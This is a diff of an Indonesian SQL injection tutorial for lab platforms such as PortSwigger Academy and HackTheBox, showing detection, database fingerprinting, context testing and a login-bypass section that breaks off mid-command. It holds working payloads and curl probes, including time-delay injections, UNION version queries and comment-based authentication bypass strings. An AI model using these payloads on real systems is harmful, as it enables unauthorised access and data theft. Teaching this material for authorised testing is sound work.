@@ -4,145 +4,82 @@ title: "💉 19 — SQL Injection Workflow"
 category: "3. Web Exploitation"
 categoryId: "web"
 filename: "19_sql_injection_workflow.md"
-refs_out: ["05","06","07","14a","17a","18","44","45","63"]
+refs_out: ["05","06","07","18","44","45","63"]
 refs_in: ["15","18","20","27","28","30"]
 ---
 
-
-
 # 💉 19 — SQL Injection Workflow
 
-> **Scope:** HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian.  
-> **OS:** Parrot OS XFCE / Debian-based  
-> **Level:** Beginner → Intermediate  
-> **Tujuan:** membangun _muscle memory_ SQL Injection dari detection → identification → exploitation → automation.
+> **Scope:** PortSwigger Web Security Academy, HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Primary Tool:** Burp Suite (Community / Pro) **Level:** Beginner → Intermediate **Tujuan:** Membangun _muscle memory_ SQL Injection dari detection → identification → exploitation → escalation, berbasis materi PortSwigger Web Security Academy.
+
+---
+
+> **🔧 Konvensi Tool di Dokumen Ini:**
+> 
+> - **`[Burp]`** → Gunakan Burp Suite Repeater/Proxy. Ini adalah tool utama.
+> - **`[curl]`** → Dipakai untuk quick check atau verifikasi output.
+> - **Payload format** → Ditampilkan dalam format URL query string yang terlihat di Burp Repeater: `category=Gifts'+UNION+SELECT+NULL--`
+> - **`+`** dalam payload = spasi (URL encoding). Di Burp Repeater kamu bisa ketik spasi langsung, Burp yang encode.
+> - **`[MySQL]` `[PgSQL]` `[MSSQL]` `[Oracle]` `[SQLite]`** → Label ini menandai syntax yang DB-specific, bukan universal.
 
 ---
 
 # 📚 Daftar Isi
 
 - [💉 0. SQL Injection Fundamentals](#-0-sql-injection-fundamentals)
-    
 - [🔎 1. Detection & Identification](#-1-detection--identification)
-    
-    - [1.1 Cara Detect SQL Injection](#11-cara-detect-sql-injection)
-        
-    - [1.2 Identify Database Type](#12-identify-database-type)
-        
-    - [1.3 Identify Injection Context](#13-identify-injection-context)
-        
-- [🔗 2. Classic/UNION SQL Injection](#-2-classicunion-sql-injection)
-    
-    - [2.1 Determine Number of Columns](#21-determine-number-of-columns)
-        
-    - [2.2 Find Displayable Columns](#22-find-displayable-columns)
-        
-    - [2.3 UNION SELECT Exploitation](#23-union-select-exploitation)
-        
-    - [2.4 Useful Queries per Database](#24-useful-queries-per-database)
-        
-    - [SQLite Cheatsheet](#sqlite-cheatsheet)
-        
-- [💥 3. Error-Based SQL Injection](#-3-error-based-sql-injection)
-    
-    - [3.1 MySQL Error-Based](#31-mysql-error-based)
-        
-    - [3.2 MSSQL Error-Based](#32-mssql-error-based)
-        
-    - [3.3 PostgreSQL Error-Based](#33-postgresql-error-based)
-        
-- [🕵️ 4. Boolean Blind SQL Injection](#-4-boolean-blind-sql-injection)
-    
-    - [4.1 Konsep Boolean Blind](#41-konsep-boolean-blind)
-        
-    - [4.2 Manual Boolean Extraction](#42-manual-boolean-extraction)
-        
-    - [4.3 Automation dengan Python](#43-automation-dengan-python)
-        
-- [⏱️ 5. Time-Based Blind SQL Injection](#-5-time-based-blind-sql-injection)
-    
-    - [5.1 Konsep Time-Based](#51-konsep-time-based)
-        
-    - [5.2 Manual Time-Based Test](#52-manual-time-based-test)
-        
-    - [5.3 Per Database Syntax](#53-per-database-syntax)
-        
-- [📡 6. Out-of-Band SQL Injection](#-6-out-of-band-sql-injection)
-    
-    - [6.1 Kapan OOB Dipakai](#61-kapan-oob-dipakai)
-        
-    - [6.2 DNS Exfiltration](#62-dns-exfiltration-konsep)
-        
-- [🔁 7. Second-Order SQL Injection](#-7-second-order-sql-injection)
-    
-    - [7.1 Konsep Second-Order](#71-konsep-second-order)
-        
-    - [7.2 Cara Identify](#72-cara-identify)
-        
-- [🤖 8. SQLMap Workflow](#-8-sqlmap-workflow)
-    
-    - [8.1 Instalasi & Verifikasi](#81-instalasi--verifikasi)
-        
-    - [8.2 Basic Usage](#82-basic-usage)
-        
-    - [8.3 Enumeration dengan SQLMap](#83-enumeration-dengan-sqlmap)
-        
-    - [8.4 Advanced SQLMap](#84-advanced-sqlmap)
-        
-    - [8.5 SQLMap Output Analysis](#85-sqlmap-output-analysis)
-        
-- [🛡️ 9. WAF Bypass Techniques](#-9-waf-bypass-techniques)
-    
-    - [9.1 Common WAF Detection](#91-common-waf-detection)
-        
-    - [9.2 Bypass Techniques](#92-bypass-techniques)
-        
-    - [9.3 SQLMap Tamper Scripts](#93-sqlmap-tamper-scripts)
-        
-- [🧱 10. Stacked Queries](#-10-stacked-queries)
-    
-    - [10.1 Kapan Stacked Queries Bisa Dipakai](#101-kapan-stacked-queries-bisa-dipakai)
-        
-    - [10.2 RCE via Stacked Queries](#102-rce-via-stacked-queries)
-        
-- [💻 11. SQL Injection to RCE](#-11-sql-injection-to-rce)
-    
-    - [11.1 MySQL — INTO OUTFILE](#111-mysql--into-outfile)
-        
-    - [11.2 MSSQL — xp_cmdshell](#112-mssql--xp_cmdshell)
-        
-    - [11.3 PostgreSQL — COPY TOFROM PROGRAM](#113-postgresql--copy-tofrom-program)
-        
-- [🍃 12. NoSQL Injection](#-12-nosql-injection)
-    
-    - [12.1 MongoDB Injection](#121-mongodb-injection)
-        
-    - [12.2 Cara Test NoSQL Injection](#122-cara-test-nosql-injection)
-        
-- [📨 13. Special Contexts](#-13-special-contexts)
-    
-    - [13.1 SQLi dalam Cookie](#131-sqli-dalam-cookie)
-        
-    - [13.2 SQLi dalam HTTP Header](#132-sqli-dalam-http-header)
-        
-    - [13.3 SQLi dalam JSON Body](#133-sqli-dalam-json-body)
-        
-    - [13.4 SQLi dalam XML](#134-sqli-dalam-xml)
-        
-    - [13.5 ORM Injection](#135-orm-injection)
-        
-- [⚙️ 14. Automation Scripts](#-14-automation-scripts)
-    
-    - [14.1 Script sqli_detect.sh](#141-script-sqlidetectsh)
-        
-    - [14.2 One-Liners](#142-one-liners)
-        
-- [🌳 15. Decision Tree](#-15-decision-tree)
-    
-- [🛠️ 16. Common Errors & Troubleshooting](#-16-common-errors--troubleshooting)
-    
-- [⬇️ Post-SQLi: Setelah Dapat Data](#%EF%B8%8F-post-sqli-setelah-dapat-data)
-    
+    - [1.1 Entry Points — Di Mana Mencari](#11-entry-points--di-mana-mencari)
+    - [1.2 Single Quote — Per Context](#12-single-quote--per-context)
+    - [1.3 Membaca Response Signals](#13-membaca-response-signals)
+    - [1.4 Identify Database Type](#14-identify-database-type)
+    - [1.5 Identify Injection Context](#15-identify-injection-context)
+- [🔓 2. Login Bypass](#-2-login-bypass)
+- [🔗 3. Classic / UNION SQL Injection](#-3-classic--union-sql-injection)
+    - [3.1 Determining Column Count](#31-determining-column-count)
+    - [3.2 Finding Displayable Column](#32-finding-displayable-column)
+    - [3.3 Retrieving Data from Other Tables](#33-retrieving-data-from-other-tables)
+    - [3.4 Retrieving Multiple Values in One Column](#34-retrieving-multiple-values-in-one-column)
+    - [3.5 Querying DB Version — Oracle](#35-querying-db-version--oracle-lab-3)
+    - [3.6 Querying DB Version — MySQL & MSSQL](#36-querying-db-version--mysql--mssql-lab-4)
+    - [3.7 Listing DB Contents — Non-Oracle](#37-listing-db-contents--non-oracle-lab-5)
+    - [3.8 Listing DB Contents — Oracle](#38-listing-db-contents--oracle-lab-6)
+    - [3.9 Useful Queries per Database](#39-useful-queries-per-database)
+- [💥 4. Error-Based SQL Injection](#-4-error-based-sql-injection)
+    - [4.1 Visible Error-Based — PostgreSQL CAST](#41-visible-error-based--postgresql-cast-lab-13)
+    - [4.2 MySQL Error-Based](#42-mysql-error-based)
+    - [4.3 MSSQL Error-Based](#43-mssql-error-based)
+    - [4.4 PostgreSQL Error-Based](#44-postgresql-error-based)
+- [🕵️ 5. Boolean Blind SQL Injection](#-5-boolean-blind-sql-injection)
+    - [5.1 Conditional Responses](#51-blind--conditional-responses-lab-11)
+    - [5.2 Conditional Errors](#52-blind--conditional-errors-lab-12)
+    - [5.3 Manual Boolean Extraction](#53-manual-boolean-extraction)
+    - [5.4 Automation dengan Python](#54-automation-dengan-python)
+- [⏱️ 6. Time-Based Blind SQL Injection](#-6-time-based-blind-sql-injection)
+    - [6.1 Time Delays](#61-blind--time-delays-lab-14)
+    - [6.2 Time Delays + Data Retrieval](#62-blind--time-delays--data-retrieval-lab-15)
+    - [6.3 Per Database Syntax](#63-per-database-syntax)
+    - [6.4 Kapan Pilih Time-Based vs Boolean](#64-kapan-pilih-time-based-vs-boolean)
+- [📡 7. Out-of-Band SQL Injection](#-7-out-of-band-sql-injection)
+    - [7.1 OOB Interaction](#71-oob-interaction-lab-16)
+    - [7.2 OOB Data Exfiltration](#72-oob-data-exfiltration-lab-17)
+- [🔁 8. Second-Order SQL Injection](#-8-second-order-sql-injection)
+- [🧩 9. Filter / Encoding / WAF Bypass](#-9-filter--encoding--waf-bypass)
+    - [9.1 XML Encoding Bypass](#91-filter-bypass-via-xml-encoding-lab-18)
+    - [9.2 WAF Detection](#92-waf-detection)
+    - [9.3 WAF Bypass Techniques](#93-waf-bypass-techniques)
+- [🤖 10. SQLMap Workflow](#-10-sqlmap-workflow)
+- [🧱 11. Stacked Queries](#-11-stacked-queries)
+- [💻 12. SQL Injection → RCE / Escalation](#-12-sql-injection--rce--escalation)
+- [🍃 13. NoSQL Injection](#-13-nosql-injection)
+- [📨 14. Special Contexts](#-14-special-contexts)
+- [⚙️ 15. Automation Scripts](#-15-automation-scripts)
+- [🌳 16. Decision Trees](#-16-decision-trees)
+- [🛠️ 17. Troubleshooting](#-17-troubleshooting)
+- [🧠 18. Muscle Memory Quick Flow](#-18-muscle-memory-quick-flow)
+- [✅ 19. Final Operational Checklist](#-19-final-operational-checklist)
+- [⬇️ 20. Post-SQLi: Cross-Service Pivot](#-20-post-sqli-cross-service-pivot)
+- [🎮 21. Interactive Decision Guide](#-21-interactive-decision-guide)
+- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
 
 ---
 
@@ -152,104 +89,64 @@ refs_in: ["15","18","20","27","28","30"]
 
 Misalnya aplikasi menerima:
 
-```text
-id=10
+```
+category=Gifts
 ```
 
-Backend dapat menjalankan:
+Backend menjalankan:
 
 ```sql
-SELECT * FROM products WHERE id=10;
+SELECT * FROM products WHERE category='Gifts' AND released=1
 ```
-
-Untuk input string:
-
-```text
-name=admin
-```
-
-query konseptual:
-
-```sql
-SELECT * FROM users WHERE name='admin';
-```
-
----
 
 ## Bagaimana SQL Injection Terjadi?
 
-Masalah muncul ketika input user langsung digabungkan ke query:
+Masalah muncul ketika input user langsung digabungkan ke query tanpa sanitasi:
 
-```text
-INPUT
-  │
-  ▼
-SQL String Concatenation
-  │
-  ▼
-Database
+```
+category=Gifts'
 ```
 
-Misalnya:
-
-```text
-name=' OR 1=1--
-```
-
-Backend yang buruk dapat menghasilkan:
+Menghasilkan query broken:
 
 ```sql
-SELECT * FROM users
-WHERE name='' OR 1=1--';
+SELECT * FROM products WHERE category='Gifts'' AND released=1
 ```
 
-Operator:
+Tanda kutip berlebih menyebabkan syntax error — ini adalah **sinyal awal**, bukan konfirmasi akhir.
 
-```text
-OR 1=1
 ```
-
-selalu bernilai TRUE.
-
----
+User Input
+    │
+    ▼
+SQL String Concatenation (tanpa sanitasi)
+    │
+    ▼
+Database
+    │
+    ▼
+Query yang berubah perilakunya
+```
 
 ## Analogi Sederhana
 
 Aplikasi mengharapkan:
 
-```text
-"nomor 10"
+```
+"nomor produk: 10"
 ```
 
 Tetapi user memberikan:
 
-```text
+```
 "10 ATAU kondisi selalu benar"
 ```
 
-Aplikasi tidak membedakan data dengan instruksi SQL.
-
-Itulah inti SQL Injection:
-
-```text
-User Input
-    │
-    ▼
-Data
-    +
-SQL Syntax
-    │
-    ▼
-Altered Query
-```
-
----
+Aplikasi tidak membedakan data dengan instruksi SQL. Itulah inti SQLi.
 
 ## Kenapa Berbahaya?
 
-Tergantung konteks dan permission database, SQLi dapat memungkinkan:
-
-```text
+```
 Authentication Bypass
        ↓
 Data Enumeration
@@ -265,419 +162,297 @@ File Read/Write
 Potential RCE
 ```
 
-Tidak semua SQLi memiliki seluruh kemampuan tersebut.
-
----
+> ⚠️ Tidak semua SQLi memiliki seluruh kemampuan tersebut. Kemampuan tergantung pada DB type, privilege, dan konfigurasi server.
 
 ## In-Band vs Inferential vs Out-of-Band
 
-|Tipe|Cara mendapatkan hasil|
-|---|---|
-|In-band|Data langsung muncul di response|
-|Inferential|Data disimpulkan dari TRUE/FALSE atau timing|
-|Out-of-band|Database membuat callback ke sistem lain|
+|Tipe|Cara Mendapatkan Hasil|Contoh Teknik|
+|---|---|---|
+|In-band|Data langsung muncul di response|UNION, Error-Based|
+|Inferential|Data disimpulkan dari TRUE/FALSE atau timing|Boolean Blind, Time-Based|
+|Out-of-band|Database membuat callback ke sistem lain|DNS exfiltration, HTTP callback|
 
-### Diagram
+```
+In-band:
+Request → DB → Response + Data langsung
 
-```text
-In-band
-Request → DB → Response + Data
+Inferential:
+Request → DB → TRUE/FALSE atau Delay → Infer Data
 
-Inferential
-Request → DB
-          │
-          └→ TRUE/FALSE atau Delay
-                    │
-                    ▼
-                 Infer Data
-
-OOB
-Request → DB
-          │
-          └→ DNS/HTTP Callback
-                    │
-                    ▼
-                 Attacker
+OOB:
+Request → DB → DNS/HTTP Callback → Attacker Listener
 ```
 
 ---
 
-## Normal Query vs Injected Query
+## Setup Burp Suite (Wajib Sebelum Mulai)
 
-```text
-NORMAL
+```
+1. Buka Burp Suite
+2. Proxy → Options → proxy listener aktif di 127.0.0.1:8080
+3. Browser: pasang FoxyProxy atau set manual proxy ke 127.0.0.1:8080
+4. Burp → Proxy → Intercept: ON saat mau intercept, OFF saat browsing biasa
+5. HTTP History → lihat semua request yang lewat
+```
 
-User Input
-   │
-   ▼
-id=10
-   │
-   ▼
-SELECT ... WHERE id=10
-   │
-   ▼
-Expected rows
+**Workflow utama:**
 
-
-INJECTED
-
-User Input
-   │
-   ▼
-id=10 OR 1=1
-   │
-   ▼
-SELECT ... WHERE id=10 OR 1=1
-   │
-   ▼
-Query behavior changed
+```
+Browse target
+     │
+     ▼
+Request masuk ke Burp HTTP History
+     │
+     ▼
+Klik kanan → Send to Repeater (Ctrl+R)
+     │
+     ▼
+Di Repeater: modifikasi parameter → Send
+     │
+     ▼
+Bandingkan response di panel kanan
 ```
 
 ---
 
 # 🔎 1. Detection & Identification
 
-# 1.1 Cara Detect SQL Injection
+## 1.1 Entry Points — Di Mana Mencari
 
-## 📌 Kapan Digunakan
+Sebelum inject apapun, petakan kandidat lokasi injection:
 
-Gunakan ketika sebuah parameter dikirimkan ke aplikasi dan Anda menduga nilainya digunakan dalam SQL query.
-
-Kandidat lokasi:
-
-```text
-GET parameter
-POST parameter
-Cookie
-HTTP Header
-JSON body
-XML body
 ```
+GET parameter          → ?id=10, ?category=Gifts
+POST parameter         → username=admin, search=test
+Cookie                 → TrackingId=xyz, session=abc
+HTTP Header            → User-Agent, X-Forwarded-For, Referer
+JSON body              → {"search":"test"}
+XML body               → <storeId>1</storeId>
+```
+
+```bash
+# Quick: lihat semua parameter di halaman
+curl -s http://TARGET | grep -oP '(href|action)="[^"]*\?[^"]*"' | sort -u
+
+# Tech stack hint (bantu tebak DB)
+curl -si http://TARGET | head -20
+```
+
+|Tech Stack|DB yang Mungkin|
+|---|---|
+|PHP + Apache/Nginx|MySQL / MariaDB|
+|ASP.NET + IIS|MSSQL|
+|Java / Spring|MySQL, PostgreSQL, Oracle|
+|Python / Flask / Django|PostgreSQL, SQLite, MySQL|
+|Node.js|MySQL, PostgreSQL, MongoDB|
+|Ruby on Rails|PostgreSQL, SQLite|
 
 ---
 
-## Single Quote — GET
+## 1.2 Single Quote — Per Context
 
-Normal:
+**📌 Tujuan:** Mengirim karakter yang bisa membreak SQL string context.
+
+### GET Parameter
 
 ```bash
-curl -i 'http://TARGET/product?id=10'
+# Normal baseline
+curl -s 'http://TARGET/item?id=10' -o baseline.html
+
+# Single quote test
+curl -s 'http://TARGET/item?id=10%27' -o quote_test.html
+# Atau dengan --data-urlencode (lebih aman untuk karakter aneh):
+curl -s --get --data-urlencode "id=10'" 'http://TARGET/item' -o quote_test.html
 ```
 
-Injection test:
+### POST Parameter
 
 ```bash
-curl -i 'http://TARGET/product?id=10%27'
+curl -s -X POST http://TARGET/search \
+  --data-urlencode "q=test'"
+# Bandingkan dengan:
+curl -s -X POST http://TARGET/search \
+  --data-urlencode "q=test"
 ```
 
-Atau:
+### Cookie
 
 ```bash
-curl -i --get \
---data-urlencode "id=10'" \
-http://TARGET/product
+curl -s http://TARGET/profile -H "Cookie: session=test'"
 ```
 
----
-
-## Single Quote — POST
+### HTTP Header
 
 ```bash
-curl -i -X POST http://TARGET/search \
---data-urlencode "q=test'"
+curl -s http://TARGET/ -H "User-Agent: test'"
+curl -s http://TARGET/ -H "X-Forwarded-For: 10.0.0.1'"
+curl -s http://TARGET/ -H "Referer: http://example.com/'"
 ```
 
-Bandingkan dengan:
+> ⚠️ Header injection hanya relevan jika header tersebut dipakai dalam SQL query server-side (logging, rate limiting, personalization). Header yang hanya dibaca oleh proxy tidak menyebabkan SQLi.
+
+### JSON Body
 
 ```bash
-curl -i -X POST http://TARGET/search \
---data-urlencode "q=test"
-```
-
----
-
-## Single Quote — Cookie
-
-```bash
-curl -i http://TARGET/profile \
--H "Cookie: session=test'"
-```
-
----
-
-## Single Quote — Header
-
-```bash
-curl -i http://TARGET/ \
--H "User-Agent: test'"
-```
-
-Contoh header lain:
-
-```bash
-curl -i http://TARGET/ \
--H "X-Forwarded-For: 10.0.0.1'"
-```
-
----
-
-## Single Quote — JSON
-
-```bash
-curl -i -X POST http://TARGET/api/search \
--H 'Content-Type: application/json' \
--d '{"search":"test'\"'\"'"}'
-```
-
-Lebih mudah dengan file:
-
-```bash
+# Buat file body
 cat > body.json <<'EOF'
 {"search":"test'"}
 EOF
 
-curl -i -X POST http://TARGET/api/search \
--H 'Content-Type: application/json' \
---data-binary @body.json
+curl -s -X POST http://TARGET/api/search \
+  -H 'Content-Type: application/json' \
+  --data-binary @body.json
 ```
 
 ---
 
-## Yang Dicari dari Response
+## 1.3 Membaca Response Signals
 
-### SQL Error
+### SQL Error Visible
 
-Contoh:
-
-```text
-You have an error in your SQL syntax
+```
+MySQL:        "You have an error in your SQL syntax"
+PostgreSQL:   "ERROR: syntax error at or near"
+MSSQL:        "Unclosed quotation mark after the character string"
+Oracle:       "ORA-01756" / "ORA-00933"
+SQLite:       "near \"...\": syntax error" / "SQLiteException"
 ```
 
-MySQL indicator.
+### Generic Error (Error Tersembunyi)
 
-PostgreSQL:
+Aplikasi mungkin tidak tampilkan SQL error langsung:
 
-```text
-ERROR: syntax error at or near
 ```
-
-MSSQL:
-
-```text
-Unclosed quotation mark after the character string
-```
-
-Oracle:
-
-```text
-ORA-01756
-```
-
-SQLite:
-
-```text
-near "...": syntax error
-```
-
----
-
-## Generic Error
-
-Kadang aplikasi menyembunyikan SQL error:
-
-```text
 500 Internal Server Error
+"Something went wrong"
+Response tiba-tiba jauh lebih kecil dari baseline
 ```
 
-atau:
+Ini bukan konfirmasi SQLi, tapi ini adalah kandidat — lanjut ke Boolean test.
 
-```text
-Something went wrong
-```
-
-Tetapi baseline:
-
-```text
-test    → 200, 1482 bytes
-test'   → 500, 931 bytes
-```
-
-Perubahan behavior tersebut merupakan indikator.
-
----
-
-## Boolean Difference
-
-Normal:
-
-```text
-?id=10
-```
-
-TRUE:
-
-```text
-?id=10 AND 1=1
-```
-
-FALSE:
-
-```text
-?id=10 AND 1=2
-```
-
-Bandingkan:
+### Boolean Difference
 
 ```bash
-curl -s 'http://TARGET/product?id=10' -o normal.txt
-curl -s 'http://TARGET/product?id=10%20AND%201%3D1' -o true.txt
-curl -s 'http://TARGET/product?id=10%20AND%201%3D2' -o false.txt
-
-wc -c normal.txt true.txt false.txt
+curl -s 'http://TARGET/item?id=10' -o baseline.html
+curl -s 'http://TARGET/item?id=10%20AND%201%3D1' -o true_test.html
+curl -s 'http://TARGET/item?id=10%20AND%201%3D2' -o false_test.html
+wc -c baseline.html true_test.html false_test.html
 ```
 
-Contoh:
+Contoh output yang mengindikasikan Boolean Blind:
 
-```text
-14820 normal.txt
-14820 true.txt
-  421 false.txt
+```
+14820   baseline.html
+14820   true_test.html
+421     false_test.html    ← FALSE berbeda!
 ```
 
-Ini sangat kuat sebagai indikator Boolean Blind.
-
----
-
-## Time Delay
-
-MySQL:
+### Time Delay
 
 ```bash
-time curl -s -o /dev/null \
-'http://TARGET/product?id=10%20AND%20SLEEP(5)'
+# MySQL
+time curl -s -o /dev/null --get \
+  --data-urlencode "id=10 AND SLEEP(5)" http://TARGET/item
+
+# PostgreSQL (lihat Section 6 untuk penjelasan syntax)
+time curl -s -o /dev/null --get \
+  --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(5))" http://TARGET/item
+
+# MSSQL
+time curl -s -o /dev/null --get \
+  --data-urlencode "id=10; WAITFOR DELAY '0:0:5'" http://TARGET/item
 ```
 
-PostgreSQL:
+### Detection Decision
 
-```bash
-time curl -s -o /dev/null \
-'http://TARGET/product?id=10%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))'
 ```
-
-MSSQL:
-
-```bash
-time curl -s -o /dev/null \
-'http://TARGET/product?id=10%20WAITFOR%20DELAY%20%2700:00:05%27'
+Single Quote dikirim
+│
+├── SQL Error visible
+│      ↓
+│   Error-Based candidate → validate di Section 4
+│
+├── Response berbeda (size / content)
+│      ↓
+│   Boolean Blind candidate → validate di Section 5
+│
+├── Delay ~5-10 detik
+│      ↓
+│   Time-Based candidate → validate di Section 6
+│
+└── Tidak ada perbedaan
+       ↓
+   Jangan simpulkan "tidak ada SQLi"
+       ↓
+   Reassess: context lain, parameter lain, encoding berbeda
 ```
 
 ---
 
-## Indikator Detection
+## 1.4 Identify Database Type
 
-```text
-Single Quote
-    │
-    ├── SQL Error
-    │      └── Error-Based Candidate
-    │
-    ├── Response Difference
-    │      └── Boolean Candidate
-    │
-    ├── Significant Delay
-    │      └── Time-Based Candidate
-    │
-    └── No Change
-           └── Test Context / Encoding / Other Parameter
-```
+### 📌 Kapan Digunakan
 
----
+Setelah menemukan indikasi SQLi. DB type menentukan seluruh syntax berikutnya.
 
-# 1.2 Identify Database Type
-
-## 📌 Kapan Digunakan
-
-Setelah menemukan indikasi SQLi dan perlu memilih syntax yang tepat.
-
-|Indikator|Database|
+|Indikator di Error|Database|
 |---|---|
-|`You have an error in your SQL syntax`|MySQL/MariaDB|
-|`mysqli`|MySQL/MariaDB|
-|`PDOException` + MySQL driver|MySQL/MariaDB|
-|`pg_query`, `PG::`|PostgreSQL|
-|`syntax error at or near`|PostgreSQL|
-|`Unclosed quotation mark`|MSSQL|
-|`Microsoft SQL Server`|MSSQL|
-|`SQLSTATE[HY000]`|Bisa tergantung driver|
-|`ORA-01756`|Oracle|
-|`ORA-00933`|Oracle|
-|`SQLiteException`|SQLite|
-|`near "...": syntax error`|SQLite|
+|`You have an error in your SQL syntax`|MySQL / MariaDB|
+|`mysqli`, `PDOException` + MySQL driver|MySQL / MariaDB|
+|`pg_query`, `PG::`, `syntax error at or near`|PostgreSQL|
+|`Unclosed quotation mark`, `Microsoft SQL Server`|MSSQL|
+|`ORA-01756`, `ORA-00933`|Oracle|
+|`SQLiteException`, `near "...": syntax error`|SQLite|
+|`SQLSTATE[HY000]`|Tergantung driver|
 
----
+### Comment Syntax per Database
 
-## Syntax Fingerprinting
+|Database|Comment Style|Catatan Penting|
+|---|---|---|
+|MySQL|`-- -` atau `#` (`%23`)|**`--` tanpa spasi tidak valid di MySQL.** Wajib ada spasi setelah `--`, atau gunakan `-- -` (lebih aman), atau `#`|
+|PostgreSQL|`--`|Standar, spasi tidak wajib|
+|MSSQL|`--`|Standar|
+|Oracle|`--`|Standar|
+|SQLite|`--`|Standar|
 
-### MySQL
+> ⚠️ **MySQL Critical:** `--` tanpa trailing space di-ignore MySQL parser. Selalu gunakan `-- -` (dash dash space dash) atau `#`/`%23`.
 
-```sql
-SELECT @@version;
+### Version Fingerprinting via Burp
+
+Setelah tahu column count (Section 3.1), inject version query:
+
 ```
-
-### PostgreSQL
-
-```sql
-SELECT version();
-```
-
-### MSSQL
-
-```sql
-SELECT @@VERSION;
-```
-
-### Oracle
-
-```sql
-SELECT banner FROM v$version;
-```
-
-### SQLite
-
-```sql
-SELECT sqlite_version();
+[MySQL]   category=Gifts'+UNION+SELECT+@@version,NULL-- -
+[PgSQL]   category=Gifts'+UNION+SELECT+version(),NULL--
+[Oracle]  category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--
+[MSSQL]   category=Gifts'+UNION+SELECT+@@VERSION,NULL--
+[SQLite]  category=Gifts'+UNION+SELECT+sqlite_version(),NULL--
 ```
 
 ---
 
-# 1.3 Identify Injection Context
+## 1.5 Identify Injection Context
 
-## String Context
+### String Context
 
-Query:
+Query backend:
 
 ```sql
-WHERE name='INPUT'
+WHERE category='INPUT'
 ```
 
-Test:
+Test di Burp Repeater:
 
-```text
-'
-''
-' OR 1=1-- -
-' OR 1=1#
+```
+Gifts'          → broken quote → error?
+Gifts''         → double quote → valid?
+Gifts'+OR+'1'='1   → TRUE
+Gifts'+OR+'1'='2   → FALSE
 ```
 
-> ⚠️ **Catatan Kritis SQL Comment (MySQL vs Lainnya):**
-> - **MySQL:** Wajib menyertakan spasi setelah tanda minus ganda (`-- ` atau `-- -`) atau menggunakan tanda pagar (`#` / `%23`). Penggunaan `--` tanpa spasi akan menghasilkan error di MySQL.
-> - **MSSQL / PostgreSQL / SQLite:** Mendukung `--` standar tanpa spasi.
+### Numeric Context
 
----
-
-## Numeric Context
-
-Query:
+Query backend:
 
 ```sql
 WHERE id=INPUT
@@ -685,3245 +460,2204 @@ WHERE id=INPUT
 
 Test:
 
-```text
-10
-10'
-10 AND 1=1
-10 AND 1=2
+```
+id=10'           → error?
+id=10+AND+1=1    → TRUE
+id=10+AND+1=2    → FALSE
 ```
 
-Command:
-
-```bash
-curl -i 'http://TARGET/item?id=10%20AND%201%3D1'
-```
-
----
-
-## Inside Quotes
-
-Contoh:
+### Inside Subquery
 
 ```sql
-WHERE username='INPUT'
-```
-
-Payload:
-
-```text
-admin'
-admin'-- -
-admin'#
-```
-
----
-
-## Inside Comments
-
-Jika aplikasi memotong input:
-
-```text
-input/*test*/
-```
-
-atau:
-
-```text
-input-- -
-```
-
-Eksperimen harus disesuaikan dengan DB dialect.
-
----
-
-## Inside Subquery
-
-Contoh konseptual:
-
-```sql
-SELECT *
-FROM users
-WHERE id=(SELECT INPUT);
+SELECT * FROM users WHERE id=(SELECT INPUT);
 ```
 
 Test:
 
-```text
+```
 1
 1+1
-1)
+1)        ← tutup parenthesis
 ```
 
-Tujuan utama:
+### Context Testing Decision
 
-```text
-mengetahui grammar position
 ```
-
----
-
-## Context Testing Diagram
-
-```text
 Parameter
    │
    ▼
-Guess context
+Guess context dari behavior
    │
-   ├── String → ' OR ...
-   ├── Numeric → 1 OR ...
-   ├── Quoted  → close quote
+   ├── String  → '+'OR+'1'='1
+   ├── Numeric → +OR+1=1
+   ├── Quoted  → tutup dengan quote yang sesuai
    ├── Comment → comment closure
-   └── Subquery → close parenthesis
+   └── Subquery → tutup parenthesis
 ```
 
 ---
 
-# 🔗 2. Classic/UNION SQL Injection
+# 🔓 2. Login Bypass
 
-> **Ini adalah bagian yang paling penting untuk muscle memory CTF.**
+### 📌 Skenario
 
----
+Query backend untuk login:
 
-# 2.1 Determine Number of Columns
-
-## 📌 Kapan Digunakan
-
-Gunakan sebelum `UNION SELECT`.
-
-Tujuan:
-
-```text
-menyamakan jumlah kolom query asli
-dengan jumlah kolom SELECT yang di-inject.
+```sql
+SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
 ```
 
----
+**Tujuan:** Login sebagai `administrator` tanpa tahu password.
 
-## ORDER BY Method
+### Payload Login Bypass
 
-Misalnya:
+**Username field — comment out password check:**
 
-```text
-?id=10
+```
+username: administrator'--
+password: (bebas, apapun)
 ```
 
-Coba:
+Yang terjadi di backend:
+
+```sql
+SELECT * FROM users WHERE username='administrator'--' AND password='apapun'
+```
+
+`--` comment out semua setelah itu → password check di-skip → login berhasil.
+
+### Burp Suite Steps
+
+```
+[Burp] Intercept POST /login request → Send to Repeater
+
+Request asli:
+POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=wiener&password=peter
+
+Ubah menjadi:
+username=administrator'--&password=apapun
+```
+
+### Variasi Login Bypass
+
+```sql
+-- Username dengan comment (paling reliable)
+administrator'--
+admin'--
+admin'-- -
+admin'#
+
+-- OR bypass (jika tidak tahu username — lebih berisiko multiple rows)
+' OR 1=1--
+' OR '1'='1'--
+' OR 1=1 LIMIT 1--
+
+-- Numeric context login
+1 OR 1=1--
+```
+
+> **Catatan:** OR bypass bisa return multiple rows yang menyebabkan error tergantung implementasi. Gunakan `LIMIT 1` atau target username spesifik jika perlu.
+
+### curl (quick check)
 
 ```bash
-curl -s 'http://TARGET/product?id=10%20ORDER%20BY%201'
-```
-
-Kemudian:
-
-```bash
-curl -s 'http://TARGET/product?id=10%20ORDER%20BY%202'
-```
-
-Lanjut:
-
-```text
-3
-4
-5
-...
-```
-
-Misalnya:
-
-```text
-ORDER BY 1 → normal
-ORDER BY 2 → normal
-ORDER BY 3 → normal
-ORDER BY 4 → error
-```
-
-Maka kemungkinan:
-
-```text
-jumlah column = 3
-```
-
-Diagram:
-
-```text
-ORDER BY 1 ✅
-ORDER BY 2 ✅
-ORDER BY 3 ✅
-ORDER BY 4 ❌
-        │
-        ▼
-   3 columns
+curl -si -X POST http://TARGET/login \
